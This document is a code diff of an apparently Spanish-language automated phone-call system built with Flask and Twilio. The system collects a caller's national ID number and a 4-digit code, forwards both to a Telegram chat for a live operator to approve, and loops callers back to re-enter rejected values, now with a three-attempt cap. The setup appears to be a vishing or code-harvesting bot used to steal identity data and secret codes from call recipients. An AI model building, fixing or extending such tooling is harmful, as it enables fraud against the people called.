@@ -306,6 +306,8 @@ def save_step1():
     if is_intermediate_revalidation:
         logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
         # NO eliminamos validacion_intermedia aquí
+        # PERO SÍ eliminamos correction_in_progress para indicar que el usuario ya corrigió
+        global_user_sessions[call_sid].pop('correction_in_progress', None)
     
     save_session_to_file(global_user_sessions)
     
@@ -328,8 +330,6 @@ def save_step1():
         data = global_user_sessions[call_sid]
         msg = f"🔄 Cédula actualizada en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
-        global_user_sessions[call_sid].pop('correction_in_progress', None)
-        save_session_to_file(global_user_sessions)
 
         response.say("Gracias. Continuando con la revalidación de sus datos.", language='es-ES')
         response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
@@ -338,8 +338,8 @@ def save_step1():
         response.say("Continuando.", language='es-ES')
         response.redirect('/step2')
     
-    
     return str(response)
+
 
 # STEP 2: CÓDIGO DE 4 DÍGITOS (SEGUNDO)
 @app.route('/step2', methods=['POST', 'GET'])
@@ -376,6 +376,8 @@ def save_step2():
     if is_intermediate_revalidation:
         logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
         # NO eliminamos validacion_intermedia aquí
+        # PERO SÍ eliminamos correction_in_progress para indicar que el usuario ya corrigió
+        global_user_sessions[call_sid].pop('correction_in_progress', None)
     
     save_session_to_file(global_user_sessions)
     
@@ -395,8 +397,6 @@ def save_step2():
     if is_intermediate_revalidation:
         msg = f"🔄 Código 4 dígitos actualizado en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
-        global_user_sessions[call_sid].pop('correction_in_progress', None)
-        save_session_to_file(global_user_sessions)
         
         response.say("Gracias. Estamos revalidando sus datos actualizados. Por favor, espere unos momentos.", language='es-ES')
         response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
@@ -505,31 +505,23 @@ def intermediate_validation_result():
             save_session_to_file(global_user_sessions)
         
         if validation == [1, 1]:  # Ambos datos correctos
-            # ELIMINAR el estado de revalidación intermedia solo cuando todo está correcto
+            # ELIMINAR el estado de revalidación intermedia Y correction_in_progress
             global_user_sessions[call_sid].pop('validacion_intermedia', None)
+            global_user_sessions[call_sid].pop('correction_in_progress', None)
             save_session_to_file(global_user_sessions)
             
             response.say("Los primeros datos son correctos. Continuemos con el último paso.", language='es-ES')
             response.redirect('/step3')  # Continuar al paso 3
             return str(response)
         else:
-            # NUEVA LÓGICA: Verificar si ya se está procesando una corrección
+            # HAY ERRORES EN LOS DATOS
+            # Verificar si ya se está procesando una corrección
             correction_in_progress = global_user_sessions[call_sid].get('correction_in_progress', False)
             
-            if correction_in_progress:
-                # Ya estamos en proceso de corrección, eliminar validación y esperar nueva
-                logger.info(f"🔄 CORRECCIÓN EN PROGRESO PARA SID={call_sid}, LIMPIANDO VALIDACIÓN ANTERIOR")
-                global_user_sessions[call_sid].pop('validacion_intermedia', None)
-                save_session_to_file(global_user_sessions)
-                
-                # Continuar esperando la nueva validación
-                response.say("Estamos procesando su corrección. Por favor espere un momento.", language='es-ES')
-                response.pause(length=8)
-                response.redirect(f"/intermediate-validation-result?sid={call_sid}")
-                return str(response)
-            else:
-                # Primera vez detectando el error, marcar corrección en progreso
+            if not correction_in_progress:
+                # PRIMERA VEZ detectando el error, marcar corrección en progreso
                 global_user_sessions[call_sid]['correction_in_progress'] = True
+                # NO eliminar la validación_intermedia aquí, la mantenemos para referencia
                 save_session_to_file(global_user_sessions)
                 
                 # Mensaje general cuando hay errores en los primeros datos
@@ -545,7 +537,45 @@ def intermediate_validation_result():
                     response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                     response.redirect('/step2')
                 return str(response)
+            else:
+                # YA ESTAMOS EN PROCESO DE CORRECCIÓN
+                # Esto significa que el usuario ya corrigió el dato y volvemos a tener una validación negativa
+                # Verificar si la validación actual es diferente a la anterior
+                
+                # Para evitar bucles infinitos, limitar el número de correcciones
+                correction_count_key = f"{call_sid}_correction_count"
+                correction_count = global_user_sessions[call_sid].get(correction_count_key, 0)
+                
+                if correction_count >= 3:  # Máximo 3 intentos de corrección
+                    logger.warning(f"⚠️ DEMASIADAS CORRECCIONES ({correction_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
+                    response.say("Lo sentimos, hemos intentado validar sus datos varias veces sin éxito. Finalizando llamada.", language='es-ES')
+                    return str(response)
+                
+                # Incrementar contador de correcciones
+                global_user_sessions[call_sid][correction_count_key] = correction_count + 1
+                save_session_to_file(global_user_sessions)
+                
+                logger.info(f"🔄 CORRECCIÓN #{correction_count + 1} PARA SID={call_sid} - VALIDACIÓN: {validation}")
+                
+                # Eliminar la validación anterior para permitir una nueva
+                global_user_sessions[call_sid].pop('validacion_intermedia', None)
+                save_session_to_file(global_user_sessions)
+                
+                response.say("Los datos siguen siendo incorrectos. Vamos a intentarlo una vez más.", language='es-ES')
+                
+                # Verificar qué dato sigue siendo incorrecto
+                if validation[0] == 0:  # Cédula sigue incorrecta
+                    logger.info(f"⚠️ CÉDULA SIGUE INCORRECTA - CORRECCIÓN #{correction_count + 1} PARA SID={call_sid}")
+                    response.say("La cédula sigue siendo incorrecta. Por favor, verifíquela e ingrésela cuidadosamente.", language='es-ES')
+                    response.redirect('/step1')
+                elif validation[1] == 0:  # Código de 4 dígitos sigue incorrecto
+                    logger.info(f"⚠️ CÓDIGO 4 DÍGITOS SIGUE INCORRECTO - CORRECCIÓN #{correction_count + 1} PARA SID={call_sid}")
+                    response.say("El código de 4 dígitos sigue siendo incorrecto. Por favor, verifíquelo e ingréselo cuidadosamente.", language='es-ES')
+                    response.redirect('/step2')
+                
+                return str(response)
     else:
+        # NO HAY VALIDACIÓN AÚN - SEGUIR ESPERANDO
         # Añadimos un contador para evitar bucles infinitos
         count_key = f"{call_sid}_intermediate_retry_count"
         retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
